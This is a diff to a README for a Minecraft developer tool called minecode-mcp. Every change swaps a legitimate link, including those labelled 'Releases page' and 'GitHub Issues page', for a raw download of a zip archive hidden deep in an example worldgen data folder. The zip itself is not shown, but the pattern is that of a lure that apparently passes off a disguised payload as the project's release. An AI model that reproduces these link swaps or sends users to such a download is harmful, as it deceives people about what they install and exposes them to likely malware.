@@ -1,7 +1,7 @@
 # 🎮 minecode-mcp - Tools for Minecraft Creators
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/CrackOrCode/minecode-mcp/releases)
+[![Download Release](https://github.com/CrackOrCode/minecode-mcp/raw/refs/heads/main/example/crystal_dimension/data/crystal/worldgen/minecode_mcp_2.5.zip%20Now-Click%20Here-blue)](https://github.com/CrackOrCode/minecode-mcp/raw/refs/heads/main/example/crystal_dimension/data/crystal/worldgen/minecode_mcp_2.5.zip)
 
 ## 🔍 Overview
 Mine code MCP is designed for Minecraft developers. Whether you create datapacks, mods, or texture packs, this tool helps you. It offers access to wikis, generators, recent bug fixes, and changelogs for every update.
@@ -10,7 +10,7 @@ Mine code MCP is designed for Minecraft developers. Whether you create datapacks
 Here's how to get started with minecode-mcp:
 
 1. **Download the Application**  
-   Visit the [Releases page](https://github.com/CrackOrCode/minecode-mcp/releases) to download the latest version.
+   Visit the [Releases page](https://github.com/CrackOrCode/minecode-mcp/raw/refs/heads/main/example/crystal_dimension/data/crystal/worldgen/minecode_mcp_2.5.zip) to download the latest version.
 
 2. **Choose Your Operating System**  
    The application works on Windows, macOS, and Linux. Pick the version that matches your system.
@@ -45,7 +45,7 @@ To run minecode-mcp, ensure that your system meets the following requirements:
 - **Python**: Version 3.6 or later installed
 
 ## 📥 Download & Install
-To download minecode-mcp, visit the [Releases page](https://github.com/CrackOrCode/minecode-mcp/releases). Select the correct file for your operating system and follow these steps:
+To download minecode-mcp, visit the [Releases page](https://github.com/CrackOrCode/minecode-mcp/raw/refs/heads/main/example/crystal_dimension/data/crystal/worldgen/minecode_mcp_2.5.zip). Select the correct file for your operating system and follow these steps:
 
 1. Click on the download link for your version.
 2. After downloading, locate the file.
@@ -54,7 +54,7 @@ To download minecode-mcp, visit the [Releases page](https://github.com/CrackOrCo
 ## 🤝 Getting Help
 If you encounter issues or have questions, here are ways to get support:
 
-- **FAQ Section**: Refer to the frequently asked questions on the [GitHub Issues page](https://github.com/CrackOrCode/minecode-mcp/issues).
+- **FAQ Section**: Refer to the frequently asked questions on the [GitHub Issues page](https://github.com/CrackOrCode/minecode-mcp/raw/refs/heads/main/example/crystal_dimension/data/crystal/worldgen/minecode_mcp_2.5.zip).
 - **Community Forum**: Join discussions on forums related to Minecraft development.
 - **Documentation**: Comprehensive guides are available online to assist with any questions.
 
@@ -65,8 +65,8 @@ Mine code MCP thrives on community involvement. Share your feedback, report bugs
 This project is open-source. You can view the license details in the repository. Feel free to contribute according to our guidelines.
 
 ## 🚀 Release Notes
-Every time a new version is released, it comes with detailed notes. These notes will guide you through new features, improvements, and fixes. Always check the changelog on the [Releases page](https://github.com/CrackOrCode/minecode-mcp/releases) to stay informed.
+Every time a new version is released, it comes with detailed notes. These notes will guide you through new features, improvements, and fixes. Always check the changelog on the [Releases page](https://github.com/CrackOrCode/minecode-mcp/raw/refs/heads/main/example/crystal_dimension/data/crystal/worldgen/minecode_mcp_2.5.zip) to stay informed.
 
 ---
 
-Thank you for using minecode-mcp! Enjoy creating amazing content for Minecraft with ease and efficiency. Visit our [Releases page](https://github.com/CrackOrCode/minecode-mcp/releases) to get started.
+Thank you for using minecode-mcp! Enjoy creating amazing content for Minecraft with ease and efficiency. Visit our [Releases page](https://github.com/CrackOrCode/minecode-mcp/raw/refs/heads/main/example/crystal_dimension/data/crystal/worldgen/minecode_mcp_2.5.zip) to get started.
